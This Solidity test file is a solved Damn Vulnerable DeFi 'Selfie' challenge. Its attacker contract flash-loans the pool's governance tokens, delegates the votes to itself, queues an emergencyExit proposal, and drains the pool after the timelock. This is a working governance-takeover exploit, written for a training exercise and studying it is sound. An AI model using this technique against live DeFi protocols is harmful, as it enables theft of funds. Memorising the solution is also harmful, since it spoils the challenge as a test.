// SPDX-License-Identifier: MIT
// Damn Vulnerable DeFi v4 (https://damnvulnerabledefi.xyz)
pragma solidity =0.8.25;

import {Test, console} from "forge-std/Test.sol";
import {DamnValuableVotes} from "../../src/DamnValuableVotes.sol";
import {SimpleGovernance} from "../../src/selfie/SimpleGovernance.sol";
import {SelfiePool} from "../../src/selfie/SelfiePool.sol";
import {IERC3156FlashBorrower} from "@openzeppelin/contracts/interfaces/IERC3156FlashBorrower.sol";

contract SelfieAttacker is IERC3156FlashBorrower {
    bytes32 private constant CALLBACK_SUCCESS = keccak256("ERC3156FlashBorrower.onFlashLoan");
    
    SelfiePool private immutable pool;
    SimpleGovernance private immutable governance;
    DamnValuableVotes private immutable token;
    address private immutable player;
    address private immutable recovery;
    
    uint256 public actionId;
    
    constructor(
        SelfiePool _pool,
        SimpleGovernance _governance,
        DamnValuableVotes _token,
        address _player,
        address _recovery
    ) {
        pool = _pool;
        governance = _governance;
        token = _token;
        player = _player;
        recovery = _recovery;
    }
    
    function attack() external {
        // FlashLoan all the tokens
        uint256 amount = pool.maxFlashLoan(address(token));
        pool.flashLoan(this, address(token), amount, "");
    }
    
    function onFlashLoan(
        address,
        address,
        uint256 amount,
        uint256,
        bytes calldata
    ) external returns (bytes32) {

        token.delegate(address(this));

        bytes memory data = abi.encodeWithSignature(
            "emergencyExit(address)",
            recovery
        );
        
        actionId = governance.queueAction(
            address(pool),
            0,
            data
        );
        
        // repay flashLoan
        token.approve(address(pool), amount);
        
        return CALLBACK_SUCCESS;
    }
    
    function executeProposal() external {
        governance.executeAction(actionId);
    }
}

contract SelfieChallenge is Test {
    address deployer = makeAddr("deployer");
    address player = makeAddr("player");
    address recovery = makeAddr("recovery");

    uint256 constant TOKEN_INITIAL_SUPPLY = 2_000_000e18;
    uint256 constant TOKENS_IN_POOL = 1_500_000e18;

    DamnValuableVotes token;
    SimpleGovernance governance;
    SelfiePool pool;

    modifier checkSolvedByPlayer() {
        vm.startPrank(player, player);
        _;
        vm.stopPrank();
        _isSolved();
    }

    /**
     * SETS UP CHALLENGE - DO NOT TOUCH
     */
    function setUp() public {
        startHoax(deployer);

        // Deploy token
        token = new DamnValuableVotes(TOKEN_INITIAL_SUPPLY);

        // Deploy governance contract
        governance = new SimpleGovernance(token);

        // Deploy pool
        pool = new SelfiePool(token, governance);

        // Fund the pool
        token.transfer(address(pool), TOKENS_IN_POOL);

        vm.stopPrank();
    }

    /**
     * VALIDATES INITIAL CONDITIONS - DO NOT TOUCH
     */
    function test_assertInitialState() public view {
        assertEq(address(pool.token()), address(token));
        assertEq(address(pool.governance()), address(governance));
        assertEq(token.balanceOf(address(pool)), TOKENS_IN_POOL);
        assertEq(pool.maxFlashLoan(address(token)), TOKENS_IN_POOL);
        assertEq(pool.flashFee(address(token), 0), 0);
    }

    function test_selfie() public checkSolvedByPlayer {
        SelfieAttacker attacker = new SelfieAttacker(
            pool,
            governance,
            token,
            player,
            recovery
        );
        
        attacker.attack();

        vm.warp(block.timestamp + 2 days);
        
        attacker.executeProposal();
    }

    /**
     * CHECKS SUCCESS CONDITIONS - DO NOT TOUCH
     */
    function _isSolved() private view {
        // Player has taken all tokens from the pool
        assertEq(token.balanceOf(address(pool)), 0, "Pool still has tokens");
        assertEq(token.balanceOf(recovery), TOKENS_IN_POOL, "Not enough tokens in recovery account");
    }
}
